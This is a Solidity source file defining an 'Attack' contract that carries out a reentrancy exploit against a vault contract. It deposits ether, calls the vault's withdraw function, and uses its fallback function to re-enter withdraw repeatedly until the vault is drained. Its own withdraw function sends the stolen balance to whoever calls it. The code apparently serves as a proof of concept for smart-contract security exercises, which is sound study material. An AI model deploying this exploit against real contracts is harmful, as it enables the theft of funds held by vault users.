// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import "hardhat/console.sol";

interface IVault{
    function deposit() external payable;
    function withdraw() external;
    function getEtherBalance() external view returns(uint256);
    function getUserBalance(address _user) external view returns (uint256);
}
contract Attack{
    IVault myvault; 

    constructor(address _address){
        myvault = IVault(_address);
    }
    function deposit() public payable {
        require(msg.value >= 0.01 ether, "Need at least 0.01 ether to commence attack.");
        myvault.deposit{value: msg.value}();
    }
    function attack() public{
        uint256 vaultBalance = myvault.getEtherBalance();
        if(vaultBalance >= 0.01 ether){
            myvault.withdraw();
        }
    }

    fallback() external payable{
        uint256 vaultBalance = myvault.getEtherBalance();
        if(vaultBalance >= 0.01 ether){
            myvault.withdraw();
        }
    }
    
    function withdraw() public {
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to withdraw sender's balance");
    }
}